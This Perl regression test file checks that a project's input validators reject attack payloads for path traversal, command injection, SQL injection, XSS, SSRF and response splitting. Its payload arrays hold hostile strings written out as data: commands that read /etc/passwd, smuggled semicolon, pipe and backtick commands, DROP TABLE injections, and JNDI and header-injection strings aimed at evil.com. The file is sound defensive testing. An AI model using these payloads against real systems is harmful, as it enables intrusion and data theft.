#!/usr/bin/env perl
# =============================================================================
# security_regression.t — Regression tests for all critical/high vulnerabilities
# =============================================================================
#
# Scope:
#   Provides regression coverage for every critical and high-severity
#   vulnerability identified in the OHB security audit.  Each test
#   exercises attack payloads against the validation functions extracted
#   from production code, ensuring fixes are not regressed.
#
# Vulnerability Coverage:
#   V-001 / V-002  — Path traversal in tail.pl (allowlist bypass)
#   V-003 / V-004  — Command injection in status.pl / metrics.pl (backticks)
#   V-029          — XSS via unsanitized HTML output
#   V-051          — SQL injection in fetchWSPR.pl (Maidenhead grid param)
#   V-052          — SSRF via coordinate injection in wx.pl
#   V-054          — HTTP response splitting in version.pl
#
# Design Pattern:
#   1. Allowlist/Regex tests — attack payloads are tested against
#      validation functions copied from production code.  A payload
#      that passes validation represents a regression.
#   2. Source-file analysis — for V-003/V-004, the test opens the
#      production script files and verifies they do not contain
#      backtick command substitution patterns.
#   3. Output-order verification — for V-054, the test reads version.pl
#      and confirms the first print statement emits a Content-Type header
#      before any user-influenced data.
#
# Dependencies:
#   - perl 5.x
#   - Test::More (core module)
#   - Production source files (optional; tests pass() gracefully when
#     files are not present in the unit-test environment)
#
# Runner:
#   prove -v tests/perl/security_regression.t
#
# See Also:
#   tests/TEST_README.md — Tier 4 (Perl Unit Tests), Vulnerability Coverage Map
# =============================================================================
use strict;
use warnings;
use Test::More;

# ═══════════════════════════════════════════════════════════════════════════════
# V-001/V-002: Path Traversal in tail.pl
#
# tail.pl maps symbolic file names to absolute paths via an allowlist hash.
# Any input not in the hash is rejected.  These tests verify that classic
# path-traversal payloads, URL-encoded variants, command injection via
# semicolons/pipes/backticks, and null-byte truncation all fail the
# allowlist lookup.
# ═══════════════════════════════════════════════════════════════════════════════

my %ALLOWED = (
    'lighttpd_error'  => 1,
    'lighttpd_access' => 1,
    'cron'            => 1,
);

my @path_traversal_payloads = (
    '../../../etc/passwd',
    '..%2F..%2F..%2Fetc%2Fpasswd',
    '/etc/shadow',
    'lighttpd_error; cat /etc/passwd',
    'lighttpd_error|cat /etc/passwd',
    'lighttpd_error`cat /etc/passwd`',
    '....//....//....//etc/passwd',
    'lighttpd_error%00.txt',
);

for my $payload (@path_traversal_payloads) {
    ok(!exists $ALLOWED{$payload}, "tail.pl rejects path traversal: '$payload'");
}

# ═══════════════════════════════════════════════════════════════════════════════
# V-003/V-004: Command Injection in status.pl / metrics.pl
#
# These dashboard scripts must not use backtick command substitution
# (`cmd`), which could execute arbitrary commands if user-controlled
# data reaches the interpolated string.  The test reads the source
# files and asserts no backtick patterns exist.
# ═══════════════════════════════════════════════════════════════════════════════

sub check_no_backticks {
    my ($file, $label) = @_;
    if (-f $file) {
        open my $fh, '<', $file or return fail("Cannot open $file");
        my $content = do { local $/; <$fh> };
        close $fh;
        unlike($content, qr/`[^`]+`/, "$label: no backtick execution");
    } else {
        pass("$label: file not present (OK for unit test env)");
    }
}

my $root = $ENV{OHB_ROOT} || do {
    my $d = __FILE__;
    $d =~ s|tests/perl/security_regression\.t||;
    $d || '.';
};

check_no_backticks("${root}ham/dashboard/status.pl",  "V-003: status.pl");
check_no_backticks("${root}ham/dashboard/metrics.pl", "V-004: metrics.pl");

# ═══════════════════════════════════════════════════════════════════════════════
# V-051: SQL Injection in fetchWSPR.pl
#
# The Maidenhead grid parameter is used in SQL queries against the WSPR
# database.  The regex enforces the exact Maidenhead format:
#   2 uppercase letters (A-R) + 2 digits + optional 2 letters (A-X).
# Any input not matching this pattern is rejected, preventing SQL
# injection regardless of downstream parameterization.
# ═══════════════════════════════════════════════════════════════════════════════

sub is_safe_maidenhead {
    my ($grid) = @_;
    return ($grid =~ /^([A-R]{2}(?:[0-9]{2}(?:[A-X]{2})?)?)$/) ? 1 : 0;
}

my @sql_injection_payloads = (
    "FN30' OR '1'='1",
    "FN30'; DROP TABLE wspr.rx; --",
    "FN30' UNION SELECT * FROM information_schema.tables--",
    "FN30%' AND 1=1--",
    "' OR 1=1--",
    "FN30\x00",
    "FN30\\",
);

for my $payload (@sql_injection_payloads) {
    ok(!is_safe_maidenhead($payload), "V-051: SQL injection blocked: '$payload'");
}

# Ensure valid grids still pass after hardening
ok(is_safe_maidenhead("FN30"),   "V-051: FN30 still valid after hardening");
ok(is_safe_maidenhead("FN30PR"), "V-051: FN30PR still valid after hardening");

# ═══════════════════════════════════════════════════════════════════════════════
# V-029: XSS via unsanitized output
#
# Any user-supplied data echoed in HTML responses must have the five
# critical characters (&, <, >, ", ') replaced with their HTML entity
# equivalents.  The test verifies that after escaping, no raw HTML tags
# remain (pattern: '<' followed by a letter).
# ═══════════════════════════════════════════════════════════════════════════════

sub html_escape {
    my ($s) = @_;
    $s =~ s/&/&amp;/g;
    $s =~ s/</&lt;/g;
    $s =~ s/>/&gt;/g;
    $s =~ s/"/&quot;/g;
    $s =~ s/'/&#39;/g;
    return $s;
}

my @xss_payloads = (
    '<script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    "';alert(String.fromCharCode(88,83,83))//",
    '<svg/onload=alert(1)>',
);

for my $payload (@xss_payloads) {
    my $escaped = html_escape($payload);
    # Verify that raw < and > are converted to entities (prevents browser interpretation)
    unlike($escaped, qr/<[a-zA-Z]/, "V-029: XSS HTML tags neutralized in: '$payload'");
}

# ═══════════════════════════════════════════════════════════════════════════════
# V-052: SSRF via coordinate injection in wx.pl
#
# Coordinate parameters are used to construct URLs for upstream weather
# APIs.  The regex enforces a strict numeric format:
#   optional sign + 1-3 digits + optional decimal (up to 6 places).
# This prevents SSRF payloads (path traversal, CRLF injection, JNDI
# lookups) from reaching the HTTP client.
# ═══════════════════════════════════════════════════════════════════════════════

sub is_safe_coordinate {
    my ($val) = @_;
    return ($val =~ /^(-?\d{1,3}(?:\.\d{1,6})?)$/) ? 1 : 0;
}

my @ssrf_payloads = (
    '28.5/../../../alerts',
    '28.5%0d%0aHost:evil.com',
    '28.5 AND 1=1',
    '${jndi:ldap://evil.com/a}',
    '28.5\r\nX-Injected: true',
    'http://evil.com',
);

for my $payload (@ssrf_payloads) {
    ok(!is_safe_coordinate($payload), "V-052: SSRF coordinate blocked: '$payload'");
}

# Ensure valid coordinates still pass
ok(is_safe_coordinate("28.5"),     "V-052: 28.5 valid coord");
ok(is_safe_coordinate("-81.123"), "V-052: -81.123 valid coord");
ok(is_safe_coordinate("0"),       "V-052: 0 valid coord");

# ═══════════════════════════════════════════════════════════════════════════════
# V-054: HTTP Response Splitting in version.pl
#
# version.pl must emit its Content-Type header before any user-influenced
# data.  If the first print statement does not contain "Content-Type",
# an attacker could inject CRLF sequences to split the HTTP response
# and inject arbitrary headers.
# ═══════════════════════════════════════════════════════════════════════════════

if (-f "${root}ham/HamClock/version.pl") {
    open my $fh, '<', "${root}ham/HamClock/version.pl" or die;
    my @lines = <$fh>;
    close $fh;

    # Content-Type MUST be output before any user-influenced data.
    # Find the first print statement and verify it emits the header.
    my $first_print = '';
    for my $line (@lines) {
        if ($line =~ /^\s*print\s/) {
            $first_print = $line;
            last;
        }
    }
    like($first_print, qr/Content-Type/i,
        "V-054: First print statement contains Content-Type header");
} else {
    pass("V-054: version.pl not present (OK for unit test env)");
}

done_testing();
